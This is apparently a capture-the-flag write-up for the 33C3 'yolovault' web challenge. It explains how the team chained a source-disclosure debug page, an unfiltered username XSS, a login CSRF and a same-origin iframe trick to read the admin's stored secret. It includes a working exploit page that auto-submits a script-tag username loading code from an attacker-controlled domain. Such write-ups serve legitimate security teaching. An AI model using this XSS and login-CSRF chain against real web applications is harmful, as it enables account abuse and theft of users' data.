# yolovault writeup - 33c3 ctf

We first viewed the html-source of the ‘index’ page after we registered a user and logged in. We saw a comment specifying where the admin panel is, which also adds a ‘GET’ parameter named ‘debug’ in the URL.

```html
<ul class="nav navbar-nav navbar-left">
<li><a>You only live once, cause yolo</a></li>
<!-- admins only <li><a href="/?page=leAdminPanel&debug">Admin Panel</a></li> -->
```

So we added ‘?debug’ to the current page, and a ‘View source’ button popped out. This button redirected us to ‘http://78.46.224.71/?page=debug&what=index’ where we could fetch the source code of all PHP files on the server by modifying the ‘what’ parameter.

![alt tag](https://github.com/pashosh-ctf/yolovault/blob/master/pics/fileinc.png?raw=true)

We then reviewed all the PHP source code, and re-read the instructions of this challenge. It states that *"Apparently you can store your secrets here. It's not all nice and shiny yet, but at least the admin seems to fully trust it already...."*. From this we assumed that the admin stores the flag as its ‘secret’.

When reviewed the ‘content.php’ page, which allowes us to let the admin browse to an arbitrary URL. From this is was quite clear that we are looking for an XSS in this website – this will allow us to steal the ‘secret’ of the admin.

![alt tag](https://github.com/pashosh-ctf/yolovault/blob/master/pics/adminlink.png?raw=true)

We first reviewed the admin panel – ‘leAdminPanel.php’. It seems like we can trigger an XSS by specifying a specific user in the ‘ids’ parameter, if contained html as one of its characteristics. The problem here is that the PHP sets the ‘Content-Type’ header as ‘text/csv’, which should prevent script from running for this page. It might be that we missed something here – but we decided to go to another directory.

We quickly noticed that there’s an XSS flow in ‘profile.php’. It reflects the username of the current php-session – which is not filtered at all.

```html
<div class="col-md-4">
<p><h3><?= $_SESSION['username']?></h3></p>
</div>
```
How can we trigger this XSS? First, we have to register a user with html tag as its username. We chose to register a user under the name ```‘<script src=”http://mydomain.com/a.js”></script>’```. When we visited the ‘profile.php’ page the XSS was triggered for us!

![alt tag](https://github.com/pashosh-ctf/yolovault/blob/master/pics/xss.png?raw=true)

How can we trigger this XSS for the admin? It is directly derived from the current php session! So using the ‘content.php’ page we specified our own VPS as the URL for the admin to visit – ‘http://mydomain.com/exploit.html’. From there, we submitted a form to the ‘login.php’ page and logged in the admin as ```‘<script src=”http://mydomain.com/a.js”></script>’```!

```html
<html>
    <head>
        <script>
            var form = document.createElement("form");
            form.method = "POST";
            form.action = "http://127.0.0.1/?page=login";
            form.target = "iframe";
            
            var user_input = document.createElement("input");
            user_input.name = "username";
            user_input.value = '<scr'+'ipt src="http://MYDOMAIN.COM/exploit.html"></sc'+'ript>';
            
            var password_input = document.createElement("input");
            password_input.name = "password";
            password_input.value = "123";
            
            form.appendChild(user_input);
            form.appendChild(password_input);
            
            document.body.appendChild(form);
            form.submit();
        </script>
    </head>
    <body>
        <iframe id='iframe'></iframe>
    </body>
</html>
```
We the added another iframe (after logging in) which pointed to ‘profile.php’ page and triggered the XSS. Yes! the XSS was triggered in the browser of the admin.

Still – this doesn’t solve this challenge. Since we logged in as another user – we completely lost the php-session of the admin. We could no longer access its secret, but only our user’s secret. We were kind of lost here, and were looking for other XSS flows … until we came up with an idea.

The same-origin-policy allows iframes to access each other’s data as long as their ‘domain’ is the same. Even though we’ve lost the admin session when the XSS is triggered – we can still abuse this fact. 

1.	Use the ‘content.php’ page to make the admin browse to ‘http://mydomain.com/exploit.html’
2.	From ‘exploit.html’, create an iframe to ‘http://127.0.0.1/?page=secret’. Since we didn’t logout the admin yet – this iframe will contain the ‘secret’ of the admin in its content. We just cannot read it.
3.	From ‘http://mydomain.com/exploit.html’, submit a form that logs in the administrator as our fake user. This allows us to later trigger the XSS flow.
4.	From ‘http://mydomain.com/exploit.html’ create an iframe to ‘http://127.0.0.1/?page=profile’. This triggers the XSS in the context of ‘http://127.0.0.1’! The same domain where the secret is located!
5.	From the XSS script, access the iframe we created in (1) and retrieve the secret. This is done using ```‘var d = window.top.frames[0].window.document;’.```
6.	Done :)


